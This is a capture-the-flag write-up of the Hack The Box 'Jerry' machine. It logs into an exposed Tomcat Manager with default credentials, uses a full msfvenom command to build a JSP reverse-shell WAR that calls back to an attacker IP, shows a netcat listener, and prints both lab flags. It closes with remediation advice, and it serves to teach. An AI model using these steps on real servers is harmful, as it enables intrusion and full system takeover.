# Hack The Box: Jerry — Machine Writeup

### 📌 Overview & Metadata
*   **Target:** Jerry (Windows)
*   **Concepts:** Default Credentials, Tomcat Manager Exploitation, RCE, Malicious WAR Deployment, Privilege Escalation via Service Accounts
*   **Pwn Date:** 22 Aug 2026

### 🧠 Core Concepts: RCE & Shells

Before diving into the exploit path, it is important to define the core mechanics of this attack.

**What is RCE (Remote Code Execution)?**
RCE is considered the "Holy Grail" of offensive security. It is a vulnerability that allows an attacker to execute arbitrary system commands or code on a target machine from a remote location. In this challenge, the ability to upload a malicious Java file to the web server granted us RCE.

**What is a Shell?**
A shell is a software interface that provides users with access to an operating system's services. In hacking, "getting a shell" means gaining command-line access (like a Bash prompt in Linux or a Command Prompt in Windows) to the target machine. 

There are two primary types of shells used in offensive security:
1.  **Reverse Shell:** The target machine initiates an outbound connection *back* to the attacker's machine. This is the most common and effective method because most firewalls block incoming connections but allow outbound traffic (like web browsing). 
2.  **Bind Shell:** The target machine opens up a specific port on its own network interface and listens for an incoming connection. The attacker must then actively connect *to* the target. This is frequently blocked by modern inbound firewall rules.

### 🔍 Reconnaissance & Initial Access

The engagement started with a standard Nmap scan, which revealed Apache Tomcat (version 7.0.88) running on port 8080. 

Navigating to the web server on that port presented the default Tomcat installation page. From there, I accessed the Tomcat Web Application Manager dashboard. By testing default administrative credentials (often `tomcat:s3cret` or similar standard defaults), I successfully authenticated into the manager panel.

### 🎯 Exploitation: Payload Generation & Deployment

Tomcat's Manager application allows administrators to upload and deploy Java applications. To exploit this feature, I used `msfvenom` to generate a custom malicious payload.

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.246 LPORT=4444 -f war -o shell.war

**Payload Breakdown:**
*   **`java/jsp_shell_reverse_tcp`:** Because Tomcat is a Java Servlet container, a JavaServer Pages (JSP) payload executes natively. The "reverse TCP" component forces the target server to initiate a connection back to my Kali machine, easily bypassing standard inbound firewall rules.
*   **`-f war`:** Tomcat deploys applications packaged as Web Application Archive (WAR) files. By formatting the output this way, the Tomcat Manager accepts the malicious file and deploys it as if it were a legitimate web application.

### 🚩 The Breach & Privilege Escalation

After setting up a Netcat listener on port 4444 (`nc -lvnp 4444`), I uploaded `shell.war` through the web interface. I then navigated to the `/shell` endpoint to trigger the application's execution.

The connection was immediately caught by my listener, dropping me into a Windows command prompt. 

Executing `whoami` revealed the most critical flaw of this machine: the Tomcat service was running with maximum administrative privileges. I landed directly as `nt authority\system`—a total infrastructure compromise right out of the gate, with zero privilege escalation required.

Navigating to the Administrator's desktop (`C:\Users\Administrator\Desktop\flags`), I found a single file titled `2 for the price of 1.txt` containing both the user and root flags.

*   **User Flag:** `7004dbcef0f854e0fb401875f26ebd00`
*   **Root Flag:** `04a8b36e1545a455393d067e772fe90e`

### 💡 Remediation & Lessons Learned

This machine is a brilliant reminder of why default configurations are lethal to network security.
1.  **Default Credentials:** Administrative panels must never be left with default credentials.
2.  **Exposed Interfaces:** Administrative interfaces like Tomcat Manager should never be exposed to the public internet. They should be restricted to internal management networks or accessed strictly via VPN.
3.  **Principle of Least Privilege (PoLP):** Service accounts running web servers should only have the minimum permissions necessary to function. Running Tomcat as `nt authority\system` meant that a single web vulnerability instantly resulted in the total compromise of the underlying operating system.
